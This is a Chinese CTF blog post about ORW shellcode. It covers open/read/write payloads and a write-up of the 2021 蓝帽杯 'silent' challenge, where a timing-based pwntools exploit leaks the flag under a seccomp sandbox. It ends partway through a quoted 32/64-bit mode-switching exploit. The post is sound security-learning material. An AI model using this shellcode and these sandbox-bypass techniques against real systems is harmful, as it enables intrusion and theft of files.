<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ORW | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>ORW</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-11-26T15:14:29.000Z" id="date"> 2023-11-26</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-11-26T07:11:28.601Z" id="updated"> 2023-11-26</time></div></span><br><span>Word Count: <div class="control">2.5k</div></span><br><span>Read Time: <div class="control">13 min</div></span></div></div><hr><div id="post-content"><p>最近复现强网杯2021赛题[shellcode]有感，特意来学习一下有关orw原理中缺少某些函数的情况如何进行ORW<br>禁用沙箱规则我在之前提到过 [[prctl-seccomp]]<br>参考了大佬!<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/754b0a2ae353">https://www.jianshu.com/p/754b0a2ae353</a></p>
<h3 id="普通-ORW"><a href="#普通-ORW" class="headerlink" title="普通 ORW"></a>普通 ORW</h3><ol>
<li><p>32 位</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">; "/home/orw/flag\x00" 保存到栈上<br>  ; 小端序<br>  ; 要注意给字符串结尾加上 '\x00'<br>  push   0x006761<br>  push   0x6c662f77<br>  push   0x726f2f65<br>  push   0x6d6f682f<br>  ; open("/home/orw/flag", O_RDONLY)<br>  ; #define O_RDONLY 0 <br>  mov eax,5       ; open() 系统调用号是 5<br>  mov ebx,esp ; "/home/orw/flag"<br>  xor ecx,ecx     ; O_RDONLY = 0<br>  xor edx,edx<br>  int 0x80        ; int 80h 会报错<br>  ; 返回 fd 保存到 eax 中<br><br>  ; read(fd, buf, count)<br>  mov ebx,eax     ; fd<br>  mov eax,3       ; read() 的系统调用号是 3<br>  mov ecx,esp     ; buf<br>  mov edx,0x30    ; count<br>  int 0x80<br><br>  ; write(fd, buf, count)<br>  mov eax,4       ; write() 的系统调用号是 4<br>  mov ebx,1       ; fd=1, write到标准输出<br>  mov ecx,esp     ; buf<br>  mov edx,0x30    ; count<br>  int 0x80<br></code></pre></td></tr></tbody></table></figure>
</li>
<li><p>64 位<br> (1). 版本一</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asm">; open("flag", 0)<br>   0:   68 66 6c 61 67          push   0x67616c66<br>   5:   6a 02                   push   0x2<br>   7:   58                      pop    rax<br>   8:   48 89 e7                mov    rdi,rsp<br>   b:   48 31 f6                xor    rsi,rsi<br>   e:   0f 05                   syscall <br><br>   ; read(fd, rsp, 0x20)<br>  10:   48 89 c7                mov    rdi,rax<br>  13:   48 31 c0                xor    rax,rax<br>  16:   48 89 e6                mov    rsi,rsp<br>  19:   6a 20                   push   0x20<br>  1b:   5a                      pop    rdx<br>  1c:   0f 05                   syscall <br><br>   ; write(1, rsp, 0x20)<br>  1e:   6a 01                   push   0x1<br>  20:   58                      pop    rax<br>  21:   6a 01                   push   0x1<br>  23:   5f                      pop    rdi<br>  24:   48 89 e6                mov    rsi,rsp<br>  27:   6a 20                   push   0x20<br>  29:   5a                      pop    rdx<br>  2a:   0f 05                   syscall<br></code></pre></td></tr></tbody></table></figure></li>
</ol>
<p>(2). 版本二</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">/* push b'flag\x00' */<br>push 0x67616c66<br>/* call open('rsp', 0, 'O_RDONLY') */<br>push (2) /* 2 */<br>pop rax<br>mov rdi, rsp<br>xor esi, esi /* 0 */<br>cdq /* rdx=0 */<br>syscall<br>/* call sendfile(1, 'rax', 0, 2147483647) */<br>mov r10d, 0x7fffffff<br>mov rsi, rax<br>push (40) /* 0x28 */<br>pop rax<br>push 1<br>pop rdi<br>cdq /* rdx=0 */<br>syscall<br></code></pre></td></tr></tbody></table></figure>

<h3 id="OR-缺-W-例题-2021-蓝帽杯初赛-slient"><a href="#OR-缺-W-例题-2021-蓝帽杯初赛-slient" class="headerlink" title="OR 缺 W (例题: 2021-蓝帽杯初赛-slient)"></a>OR 缺 W (例题: 2021-蓝帽杯初赛-slient)</h3><ol>
<li>文件</li>
</ol>
<blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA">https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA</a><br>提取码：a6gt</p>
</blockquote>
<p>题目保护如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kylinxin🚀LAPTOP-O0CAV6MM)-[/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w]<br>└─✨ checksec chall<br>[*] <span class="hljs-string">'/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w/chall'</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure>

<p>沙箱保护开启如下，只能允许read，open，禁用了write，那么意味着我们ORW组合技只有OR可以使用</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">Welcome to silent execution-box.<br><br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></tbody></table></figure>

<p>逆向代码分析</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">  ......<br><span class="hljs-comment">// 逆向代码片段</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to silent execution-box."</span>);<br><br>  v3 = getpagesize();<br>  <span class="hljs-comment">// 利用 mmap 函数在 0x10000 处开辟一个 page 的空间</span><br>  v9 = (<span class="hljs-type">int</span>)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1000</span>, v3, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br><br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);<br><br>  <span class="hljs-comment">// 设置沙盒</span><br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  prctl(<span class="hljs-number">4</span>, <span class="hljs-number">0LL</span>);<br>  v8 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_load(v8);<br><br>  <span class="hljs-comment">// 往 &amp;buf 中读入 0x40 字节数据</span><br>  <span class="hljs-comment">// 然后执行这段数据</span><br>  v4 = buf;<br>  ......<br>  *(_OWORD *)v9 = v4;<br>  ((<span class="hljs-type">void</span> (__fastcall *)(__int64, __int64, __int64))v9)(<span class="hljs-number">0xDEADBEEF</span>LL, <span class="hljs-number">0xDEADBEEF</span>LL, <span class="hljs-number">0xDEADBEEF</span>LL);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// about mmap (link: https://man7.org/linux/man-pages/man2/mmap.2.html)</span><br><span class="hljs-comment">// 1. SYNOPSIS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><br><span class="hljs-comment">/* 2. DESCRIPTION</span><br><span class="hljs-comment"> mmap() creates a new mapping in the virtual address space of the</span><br><span class="hljs-comment">       calling process.  The starting address for the new mapping is</span><br><span class="hljs-comment">       specified in addr.  The length argument specifies the length of</span><br><span class="hljs-comment">       the mapping (which must be greater than 0).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       If addr is NULL, then the kernel chooses the (page-aligned)</span><br><span class="hljs-comment">       address at which to create the mapping; this is the most portable</span><br><span class="hljs-comment">       method of creating a new mapping.  If addr is not NULL, then the</span><br><span class="hljs-comment">       kernel takes it as a hint about where to place the mapping; on</span><br><span class="hljs-comment">       Linux, the kernel will pick a nearby page boundary (but always</span><br><span class="hljs-comment">       above or equal to the value specified by</span><br><span class="hljs-comment">       /proc/sys/vm/mmap_min_addr) and attempt to create the mapping</span><br><span class="hljs-comment">       there.  If another mapping already exists there, the kernel picks</span><br><span class="hljs-comment">       a new address that may or may not depend on the hint.  The</span><br><span class="hljs-comment">       address of the new mapping is returned as the result of the call.</span><br><span class="hljs-comment">......</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></tbody></table></figure>

<p>由 <code>on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr)</code> 可知：Linux 为 <code>mmap</code> 分配虚拟内存时，总是从最接近 <code>addr</code> 的页边缘开始的，而且保证地址不低于 <code>/proc/sys/vm/mmap_min_addr</code> 所指定的值。<br>可以看到，<code>mmap_min_addr = 65536 = 0x10000</code>，因此刚才判断程序利用 mmap 函数在 0x10000 处开辟一个 page 的空间。</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kylinxin🚀LAPTOP-O0CAV6MM)-[<span class="hljs-regexp">/mnt/</span>e<span class="hljs-regexp">/CTF/</span>PWN<span class="hljs-regexp">/study_path/</span>stackOverflow<span class="hljs-regexp">/orw/</span>orw_no_w]<br>└─✨ cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/vm/mm</span>ap_min_addr<br><span class="hljs-number">65536</span><br></code></pre></td></tr></tbody></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><pre><code>既然不能 `write`，便只能用 `open` 函数打开 flag 文件后将其中保存的 flag 用 `read` 函数读取出来，再逐字节遍历，与所有的打印字符用 `cmp` 进行比较，一个一个字节地爆破出来。详见 EXP。
</code></pre>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-  </span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">import</span> time  <br>  <br>context(arch=<span class="hljs-string">"amd64"</span>, os=<span class="hljs-string">"linux"</span>)  <span class="hljs-comment"># , log_level = "debug")  </span><br>  <br>  <br><span class="hljs-comment"># 判断第 index 个字符是否是 chdef pwn(p, index, ch):  </span><br>    <span class="hljs-comment"># 运行时需要去掉 shellcode 中的注释  </span><br>    <span class="hljs-comment"># ; open(0x10039, 0)  </span><br>    <span class="hljs-comment"># ; 0x10039 这个地址存放文件名  </span><br>    <span class="hljs-comment"># ; fd 存放在 rax    shellcode = """  </span><br>    push <span class="hljs-number">0x10039</span>    pop rdi    xor esi, esi    push <span class="hljs-number">2</span>    pop rax    syscall  <br>    mov rdi, rax    xor eax, eax    push <span class="hljs-number">0x50</span>    pop rdx    push <span class="hljs-number">0x10040</span>    pop rsi    syscall  <br>    loop:    cmp byte ptr[rsi+{<span class="hljs-number">0</span>}], {<span class="hljs-number">1</span>}    jz loop    ret    <span class="hljs-string">""".format(index, ch)  </span><br><span class="hljs-string">    #     ; 此时 rsi 存放的即为保存 flag 的地址  </span><br><span class="hljs-string">    #     ; 检查 flag[index] 是否等于 ch    #     ; 若相等便卡在这个循环里面  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    # 在这里写入文件名  </span><br><span class="hljs-string">    payload = asm(shellcode).ljust(0x40 - 7, 'a') + './flag\x00'  </span><br><span class="hljs-string">    p.sendafter("Welcome to silent execution-box.\n", payload)  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">flag = ""  </span><br><span class="hljs-string">index = 0  </span><br><span class="hljs-string">last = 'a'  </span><br><span class="hljs-string">while True:  </span><br><span class="hljs-string">    # 逐字符爆破  </span><br><span class="hljs-string">    update = False  </span><br><span class="hljs-string">    # 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127)    for ch in range(32, 127):  </span><br><span class="hljs-string">        sh = process("./chall")  </span><br><span class="hljs-string">        # 远程比较容易断，可以多次连接  </span><br><span class="hljs-string">        '''  </span><br><span class="hljs-string">        for i in range(10):            try:                sh = remote("1.1.1.1", "11111")                break            except:                sleep(3)                continue        '''        pwn(sh, index, ch)  </span><br><span class="hljs-string">        start = time.time()  </span><br><span class="hljs-string">        try:  </span><br><span class="hljs-string">            sh.recv(timeout=2)  </span><br><span class="hljs-string">        except:  </span><br><span class="hljs-string">            pass  </span><br><span class="hljs-string">        end = time.time()  </span><br><span class="hljs-string">        sh.close()  </span><br><span class="hljs-string">        # 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch        if (end - start &gt; 1.5):  </span><br><span class="hljs-string">            flag += chr(ch)  </span><br><span class="hljs-string">            last = chr(ch)  </span><br><span class="hljs-string">            update = True  </span><br><span class="hljs-string">            print("[ flag + 1 !!! ] " + flag)  </span><br><span class="hljs-string">            break  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    assert (update == True)  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    if (last == '}'):  </span><br><span class="hljs-string">        break  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    index += 1  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">print("flag: " + flag)</span><br></code></pre></td></tr></tbody></table></figure>


<h3 id="RW-缺-O"><a href="#RW-缺-O" class="headerlink" title="RW 缺 O"></a>RW 缺 O</h3><p>参考资料：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://xz.aliyun.com/t/6645">shellcode 的艺术</a><br>详情请看文章中的 “六、禁用了system和open，还限制了shellcode字符”，里面用 ex 师傅的一道题目为例。<br>在 ex 师傅的这道题中，程序是 64 位的，禁用了 <code>open</code> 函数，但是允许调用 <code>fstat</code> 函数（该函数的 64 位系统调用号为 5，这个是 <code>open</code> 函数的 32 位系统调用号）。因此，这道题的基本思路就是利用 <code>retfq</code> 汇编指令进行 32 位和 64 位系统格式之间的切换，在 32 位格式下执行 <code>open</code> 函数打开 <code>flag</code> 文件，在 64 位格式下执行输入输出。<br>而且，由于这道题限制输入的 shellcode 必须是可打印字符，在写 shellcode 的时候还需要使用一些技巧，基本思路就是：对于一些（对应的字节码是不可打印字符）的汇编指令，利用可打印字符之间的算术操作（主要是异或）来获取。具体可以参考文章中的 “三、限制字符”。<br>下面是文章中的代码，自己加了一点注释：</p>
  <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./shellcode'</span>)<br><span class="hljs-comment"># p = remote("nc.eonew.cn","10011")</span><br>p.recvuntil(<span class="hljs-string">"shellcode: "</span>)<br><br>append_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">push ebx</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">'''</span><br>append = <span class="hljs-string">'''</span><br><span class="hljs-string">/* 机器码: 52 5a */</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">'''</span><br><br>shellcode_x86 